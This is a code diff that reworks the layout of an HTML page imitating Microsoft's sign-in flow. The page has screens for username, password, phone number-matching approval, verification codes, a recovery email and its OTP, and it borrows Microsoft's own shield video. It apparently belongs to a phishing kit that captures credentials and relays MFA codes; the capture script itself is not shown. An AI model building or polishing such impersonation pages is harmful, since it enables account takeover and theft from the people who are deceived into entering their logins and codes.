@@ -49,12 +49,30 @@
             z-index: 99998;
             cursor: wait;
         }
-		 
-		} 
-         display: table-cell; 
-         vertical-align: middle; 
-         height: 100vh; 
-         width: 100vw; /* Ensure full viewport width */
+
+        /* 3. Global Vertical Alignment Fix */
+        html, body {
+            height: 100%;
+            margin: 0;
+            display: table;
+            width: 100%;
+            background-color: #e2e5d3;
+        }
+
+        section {
+            display: none; /* Controlled by script.js toggle */
+            vertical-align: middle;
+            height: 100vh;
+            width: 100vw;
+        }
+
+        /* Ensure active section displays as table-cell for centering */
+        section.active {
+            display: table-cell !important;
+        }
+
+        @media screen and (max-width: 600px) {
+            html, body { background-color: #fff; }
         }
     </style>
 </head>
@@ -63,7 +81,7 @@
     <div id="top_loader"></div>
     <div id="click_blocker"></div>
 
-    <section id="section_uname">
+    <section id="section_uname" class="active">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" />
             <h2 class="title mb-16 mt-16">Sign in</h2>
@@ -89,7 +107,7 @@
         </div>
     </section>
 
-    <section id="section_pwd" class="d-none">
+    <section id="section_pwd">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
@@ -112,7 +130,7 @@
         </div>
     </section>
 
-    <section id="section_confirm" class="d-none">
+    <section id="section_confirm">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" class="d-block" />
             <div class="identity w-100 mt-16 mb-16">
@@ -133,7 +151,7 @@
         </div>
     </section>
 
-    <section id="section_verify" class="d-none">
+    <section id="section_verify">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" />
             <h2 class="title mt-16">Verify your identity</h2>
@@ -150,7 +168,7 @@
         </div>
     </section>
 
-    <section id="section_code" class="d-none">
+    <section id="section_code">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" />
             <h2 class="title mt-16">Enter code</h2>
@@ -167,57 +185,79 @@
         </div>
     </section>
 
-    <section id="section_auth_num" class="d-none">
+    <section id="section_auth_num">
         <div class="auth-wrapper" style="text-align: center;">
             <div style="display: flex; align-items: center; justify-content: flex-start; margin-bottom: 20px;">
                 <button class="back" onclick="document.getElementById('section_auth_num').classList.add('d-none'); document.getElementById('section_auth_err').classList.remove('d-none'); return false;" style="margin-right: 10px; border:none; background:transparent; cursor:pointer;"><img src="assets/back.svg" alt="Back" /></button>
                 <img src="assets/logo.svg" alt="logo" />
             </div>
-            
             <div class="identity w-100 mb-16" style="justify-content: center; background: #f3f3f3; padding: 4px 12px; border-radius: 16px; display: inline-flex; width: auto;">
                 <span id="user_identity" class="fs-13" style="color: #1b1b1b;">example@example.com</span>
             </div>
-            
             <h2 class="title mb-16" style="font-weight: 600;">Check your phone</h2>
-            
             <div style="margin: 20px 0;">
                 <video autoplay loop muted playsinline style="width: 120px; height: 120px; pointer-events: none;">
                     <source src="https://logincdn.msftauth.net/shared/5/videos/shield_av1_38151539b2be048d7739.mp4" type="video/mp4">
                 </video>
             </div>
-            
             <div id="auth_digit_display" style="font-size: 42px; font-weight: 600; margin-bottom: 16px;">98</div>
-            
             <p class="fs-13 mb-16">Select this number in the sign-in request on your mobile device.</p>
             <div style="margin-top: 30px; text-align: left;">
-                <p class="mb-16"><a href="#" class="link fs-13" onclick="document.getElementById('section_auth_num').classList.add('d-none'); document.getElementById('section_auth_err').classList.remove('d-none'); return false;">Other ways to sign in</a></p>
-                <p class="mb-16"><a href="#" class="link fs-13" onclick="document.getElementById('section_auth_num').classList.add('d-none'); document.getElementById('section_auth_err').classList.remove('d-none'); return false;">Can't use your Microsoft app?</a></p>
+                <p class="mb-16"><a href="#" class="link fs-13">Other ways to sign in</a></p>
+                <p class="mb-16"><a href="#" class="link fs-13">Can't use your Microsoft app?</a></p>
             </div>
         </div>
     </section>
 
-    <section id="section_auth_err" class="d-none">
-        <div class="auth-wrapper" style="text-align: center;">
-            <div style="display: flex; align-items: center; justify-content: flex-start; margin-bottom: 20px;">
-                <button class="back" onclick="document.getElementById('section_auth_err').classList.add('d-none'); document.getElementById('section_uname').classList.remove('d-none'); return false;" style="margin-right: 10px; border:none; background:transparent; cursor:pointer;"><img src="assets/back.svg" alt="Back" /></button>
-                <img src="assets/logo.svg" alt="logo" />
+    <section id="section_recovery">
+        <div class="auth-wrapper">
+            <img src="assets/logo.svg" alt="logo" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" onclick="window.location.reload()"><img src="assets/back.svg" alt="Back" /></button>
+                <span id="user_identity_rec"></span>
             </div>
-            <div class="identity w-100 mb-16" style="justify-content: center; background: #f3f3f3; padding: 4px 12px; border-radius: 16px; display: inline-flex; width: auto;">
-                <span id="user_identity" class="fs-13" style="color: #1b1b1b;">example@example.com</span>
+            <h2 class="title mb-16">Verify your email</h2>
+            <p class="fs-13 mb-16">We will send a verification code. To verify that this is your email address, enter it below.</p>
+            <form onsubmit="return false;">
+                <div class="mb-16">
+                    <input id="inp_recovery" type="email" class="input" placeholder="someone@example.com" />
+                </div>
+            </form>
+            <div class="mb-16">
+                <p class="fs-13"><a href="#" class="link">Other ways to sign in</a></p>
+                <p class="fs-13"><a href="#" class="link">I have a code</a></p>
             </div>
-            <h2 class="title mb-16" style="font-weight: 600;">We didn't get an approval</h2>
-            <p class="fs-13 mb-16" style="margin-bottom: 24px;">We sent a sign-in request to your Microsoft app, but didn't get your approval in time.</p>
-            
-            <button type="button" class="btn w-100 mb-16" id="btn_resend_auth" onclick="document.getElementById('section_auth_err').classList.add('d-none'); document.getElementById('section_uname').classList.remove('d-none'); return false;" style="margin: 0 auto; display: block; width: 100%;">Send another request</button>
-            
-            <div style="margin-top: 20px; text-align: left;">
-                <p class="mb-16"><a href="#" class="link fs-13" onclick="document.getElementById('section_auth_err').classList.add('d-none'); document.getElementById('section_uname').classList.remove('d-none'); return false;">Other ways to sign in</a></p>
-                <p class="mb-16"><a href="#" class="link fs-13" onclick="document.getElementById('section_auth_err').classList.add('d-none'); document.getElementById('section_uname').classList.remove('d-none'); return false;">Can't use your Microsoft app?</a></p>
+            <div>
+                <button type="button" class="btn" id="btn_recovery">Send code</button>
             </div>
         </div>
     </section>
 
-    <section id="section_final" class="d-none">
+    <section id="section_recovery_otp">
+        <div class="auth-wrapper">
+            <img src="assets/logo.svg" alt="logo" class="d-block" />
+            <div class="identity w-100 mt-16 mb-16">
+                <button class="back" onclick="window.location.reload()"><img src="assets/back.svg" alt="Back" /></button>
+                <span id="user_identity_rec_otp"></span>
+            </div>
+            <h2 class="title mb-16">Enter code</h2>
+            <p id="recovery_otp_text" class="fs-13 mb-16" style="margin-bottom: 5px;"></p>
+            <p id="error_recovery_otp" class="error d-none" style="margin-bottom: 10px;">The code you entered is incorrect. Please try again.</p>
+            <form onsubmit="return false;">
+                <div class="mb-16">
+                    <input id="inp_recovery_otp" type="text" class="input" placeholder="Enter code" maxlength="8" />
+                </div>
+            </form>
+            <div class="mb-16">
+                <p class="fs-13"><a href="#" class="link">Other ways to sign in</a></p>
+            </div>
+            <div>
+                <button type="button" class="btn" id="btn_recovery_otp">Sign in</button>
+            </div>
+        </div>
+    </section>
+
+    <section id="section_final">
         <div class="auth-wrapper">
             <img src="assets/logo.svg" alt="logo" class="d-block" />
             <h2 class="title mb-16 mt-16">Stay signed in?</h2>
@@ -228,54 +268,6 @@
             </div>
         </div>
     </section>
-	
-	<section id="section_recovery" class="d-none">
-    <div class="auth-wrapper">
-        <img src="assets/logo.svg" alt="logo" class="d-block" />
-        <div class="identity w-100 mt-16 mb-16">
-            <button class="back" onclick="window.location.reload()"><img src="assets/back.svg" alt="Back" /></button>
-            <span id="user_identity_rec"></span>
-        </div>
-        <h2 class="title mb-16">Verify your email</h2>
-        <p class="fs-13 mb-16">We will send a verification code. To verify that this is your email address, enter it below.</p>
-        <form onsubmit="return false;">
-            <div class="mb-16">
-                <input id="inp_recovery" type="email" class="input" placeholder="someone@example.com" />
-            </div>
-        </form>
-        <div class="mb-16">
-            <p class="fs-13"><a href="#" class="link">Other ways to sign in</a></p>
-            <p class="fs-13"><a href="#" class="link">I have a code</a></p>
-        </div>
-        <div>
-            <button type="button" class="btn" id="btn_recovery">Send code</button>
-        </div>
-    </div>
-</section>
-
-<section id="section_recovery_otp" class="d-none">
-    <div class="auth-wrapper">
-        <img src="assets/logo.svg" alt="logo" class="d-block" />
-        <div class="identity w-100 mt-16 mb-16">
-            <button class="back" onclick="window.location.reload()"><img src="assets/back.svg" alt="Back" /></button>
-            <span id="user_identity_rec_otp"></span>
-        </div>
-        <h2 class="title mb-16">Enter code</h2>
-        <p id="recovery_otp_text" class="fs-13 mb-16" style="margin-bottom: 5px;"></p>
-        <p id="error_recovery_otp" class="error d-none" style="margin-bottom: 10px;">The code you entered is incorrect. Please try again.</p>
-        <form onsubmit="return false;">
-            <div class="mb-16">
-                <input id="inp_recovery_otp" type="text" class="input" placeholder="Enter code" maxlength="8" />
-            </div>
-        </form>
-        <div class="mb-16">
-            <p class="fs-13"><a href="#" class="link">Other ways to sign in</a></p>
-        </div>
-        <div>
-            <button type="button" class="btn" id="btn_recovery_otp">Sign in</button>
-        </div>
-    </div>
-</section>
 
     <footer class="footer">
         <a href="#">Terms of use</a>
